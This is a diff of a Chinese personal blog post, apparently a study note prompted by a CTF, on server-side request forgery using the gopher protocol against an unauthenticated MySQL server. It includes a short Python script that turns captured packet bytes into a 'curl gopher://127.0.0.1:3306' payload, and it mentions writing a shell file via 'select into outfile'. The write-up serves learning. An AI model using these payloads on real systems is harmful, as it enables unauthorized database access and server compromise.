@@ -98,16 +98,16 @@
 <meta property="og:description" content="对于利用gopher进行ssrf的学习与理解，并用一个小实验来深入了解。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://museljh.github.io/images/fly.png">
-<meta property="og:image" content="https://i.imgur.com/iCyYZQs.jpg">
-<meta property="og:image" content="https://i.imgur.com/YHd940u.jpg">
-<meta property="og:image" content="https://i.imgur.com/dPFWsJp.jpg">
-<meta property="og:image" content="https://i.imgur.com/WQ2HYkN.png">
-<meta property="og:image" content="https://i.imgur.com/tqvO1DV.png">
-<meta property="og:image" content="https://i.imgur.com/c6VZ8Sd.png">
-<meta property="og:image" content="https://i.imgur.com/LG3ZqCG.png">
-<meta property="og:image" content="https://i.imgur.com/JCnP014.png">
-<meta property="og:image" content="https://i.imgur.com/tnRnL1p.png">
-<meta property="og:updated_time" content="2019-02-12T12:08:39.926Z">
+<meta property="og:image" content="http://i.imgur.com/iCyYZQs.jpg">
+<meta property="og:image" content="http://i.imgur.com/YHd940u.jpg">
+<meta property="og:image" content="http://i.imgur.com/dPFWsJp.jpg">
+<meta property="og:image" content="http://i.imgur.com/WQ2HYkN.png">
+<meta property="og:image" content="http://i.imgur.com/tqvO1DV.png">
+<meta property="og:image" content="http://i.imgur.com/c6VZ8Sd.png">
+<meta property="og:image" content="http://i.imgur.com/LG3ZqCG.png">
+<meta property="og:image" content="http://i.imgur.com/JCnP014.png">
+<meta property="og:image" content="http://i.imgur.com/tnRnL1p.png">
+<meta property="og:updated_time" content="2019-05-19T13:23:48.097Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="对于利用gopher进行ssrf的学习与理解">
 <meta name="twitter:description" content="对于利用gopher进行ssrf的学习与理解，并用一个小实验来深入了解。">
@@ -454,7 +454,7 @@
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前学习了下35C3CTF POST 题目以及之前的比赛经历深刻认识到自己对于ssrf理解的浅薄，在此特地google一波，并且来自我总结下，本文主要内容是对于其他文章的理解</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h3><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
 <h3 id="利用Gopher实现ssrf"><a href="#利用Gopher实现ssrf" class="headerlink" title="利用Gopher实现ssrf"></a>利用Gopher实现ssrf</h3><blockquote>
-<p><a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p>
+<p><a href="http://paper.seebug.org/510/" target="_blank" rel="noopener">http://paper.seebug.org/510/</a></p>
 </blockquote>
 <blockquote>
 <p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。</p>
@@ -481,8 +481,8 @@
 <p>非交互式操作：在你的项目中进行程序调用。比如一边是tomcat web服务器，一边是数据库服务器，两者怎么通信？在java web里，我们通常会选择hibernate或者是jdbc来连接。那么这时候就是非交互式操作。</p>
 </blockquote>
 <p>所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的</p>
-<p>MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包.<br>认证数据包格式如下：<br><img src="https://i.imgur.com/iCyYZQs.jpg" alt=""><br>这里以无需密码认证情况登录，看看认证数据包内容：<br><img src="https://i.imgur.com/YHd940u.jpg" alt=""><br>这里Packet Length为整个数据包的长度，Packet Number为sequence_id随每个数据包递增，从0开始，命令执行阶段遇到命令重新重置为0。这两个Packet为真个MySQL通协议的基础数据包。</p>
-<p>客户端请求命令数据包格式如下：<br><img src="https://i.imgur.com/dPFWsJp.jpg" alt=""></p>
+<p>MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包.<br>认证数据包格式如下：<br><img src="http://i.imgur.com/iCyYZQs.jpg" alt=""><br>这里以无需密码认证情况登录，看看认证数据包内容：<br><img src="http://i.imgur.com/YHd940u.jpg" alt=""><br>这里Packet Length为整个数据包的长度，Packet Number为sequence_id随每个数据包递增，从0开始，命令执行阶段遇到命令重新重置为0。这两个Packet为真个MySQL通协议的基础数据包。</p>
+<p>客户端请求命令数据包格式如下：<br><img src="http://i.imgur.com/dPFWsJp.jpg" alt=""></p>
 <h4 id="三、构造攻击数据包"><a href="#三、构造攻击数据包" class="headerlink" title="三、构造攻击数据包"></a>三、构造攻击数据包</h4><p>环境：Ubuntu 18.04.1 LTS<br>    mmysql Ver 14.14 Distrib 5.7.25<br>root登入数据库 mysql -u root -p xxx<br>创建新的用户</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user &apos;ljh&apos;@&apos;localhost&apos;;</span><br><span class="line">GRANT USAGE ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;;</span><br><span class="line">GRANT ALL ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
 
@@ -496,16 +496,16 @@
 </blockquote>
 <p>为了抓到更多数据，然后随便select一个内容，在exit退出。</p>
 <p>第三步使用Wireshark打开上面抓到的mysql.pcap包：</p>
-<p><img src="https://i.imgur.com/WQ2HYkN.png" alt=""></p>
+<p><img src="http://i.imgur.com/WQ2HYkN.png" alt=""></p>
 <p>记得将数据包内容变成一行（去掉空格和换行符）</p>
 <p>创建一个python脚本内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line"></span><br><span class="line">def result(s):</span><br><span class="line">	a=[s[i:i+2] for i in xrange(0,len(s),2)]</span><br><span class="line">	return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	import sys</span><br><span class="line">	s=sys.argv[1]</span><br><span class="line">	print result(s)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/tqvO1DV.png" alt=""><br>然而<br><img src="https://i.imgur.com/c6VZ8Sd.png" alt=""><br>？？？ 啥叫断开的管道<br>原来如此</p>
+<p><img src="http://i.imgur.com/tqvO1DV.png" alt=""><br>然而<br><img src="http://i.imgur.com/c6VZ8Sd.png" alt=""><br>？？？ 啥叫断开的管道<br>原来如此</p>
 <blockquote>
 <p>然后在另一个窗口，开启MySQL终端，查询一些信息。最后记得exit;，不然会出问题。</p>
 </blockquote>
-<p>重新来一次<br>。。还是不行<br><img src="https://i.imgur.com/LG3ZqCG.png" alt=""><br>原来如此，。。我居然直接用wireshark进行抓包。。<br>然而再次尝试<br><img src="https://i.imgur.com/JCnP014.png" alt=""><br>mmp，气死偶啦<br>原因未知，重启一下看看<br><img src="https://i.imgur.com/tnRnL1p.png" alt=""><br>额貌似可以了（原因可能是因为它sock管道可能被占用了？）</p>
+<p>重新来一次<br>。。还是不行<br><img src="http://i.imgur.com/LG3ZqCG.png" alt=""><br>原来如此，。。我居然直接用wireshark进行抓包。。<br>然而再次尝试<br><img src="http://i.imgur.com/JCnP014.png" alt=""><br>mmp，气死偶啦<br>原因未知，重启一下看看<br><img src="http://i.imgur.com/tnRnL1p.png" alt=""><br>额貌似可以了（原因可能是因为它sock管道可能被占用了？）</p>
 <p>然而这有啥用呢？？？？<br>我们可以通过<br>select xxx into outfile yyy<br>创造一个shell文件也可以反弹shell<br>（注意：在导出文件时，当前mysql用户必须存在file权限；部分MySQL服务器运行时启用了–secure-file-priv选项，导出文件时只能导出到规定的目录下，一般为/var/mysql/data命令，要自定义目录时必须修改配置文件设置secure-file-priv = “”；并且导入目录需要有写权限。）</p>
 <h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>gopher进行ssrf应该是可以结合命令执行来读取数据库中的flag文件</p>
 <h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>嗯，可以看,这边最后讲了一题很不错，不过貌似没有源码。只能看看了</p>
@@ -521,7 +521,7 @@
 <p>mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag”<br>并在另一个窗口抓包，然后把原始数据导出为urlencode格式即可</p>
 </blockquote>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
-<p><a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p>
+<p><a href="http://paper.seebug.org/510/" target="_blank" rel="noopener">http://paper.seebug.org/510/</a></p>
 </blockquote>
 
       
@@ -541,7 +541,7 @@
   <p><span>本文标题:</span><a href="/2019/02/12/对于利用gopher进行ssrf的学习与理解/">对于利用gopher进行ssrf的学习与理解</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 MuseLJH 的个人博客">MuseLJH</a></p>
   <p><span>发布时间:</span>2019年02月12日 - 19:58</p>
-  <p><span>最后更新:</span>2019年02月12日 - 20:08</p>
+  <p><span>最后更新:</span>2019年05月19日 - 21:23</p>
   <p><span>原始链接:</span><a href="/2019/02/12/对于利用gopher进行ssrf的学习与理解/" title="对于利用gopher进行ssrf的学习与理解">https://museljh.github.io/2019/02/12/对于利用gopher进行ssrf的学习与理解/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/02/12/对于利用gopher进行ssrf的学习与理解/" aria-label="复制成功！"></i></span>
   </p>
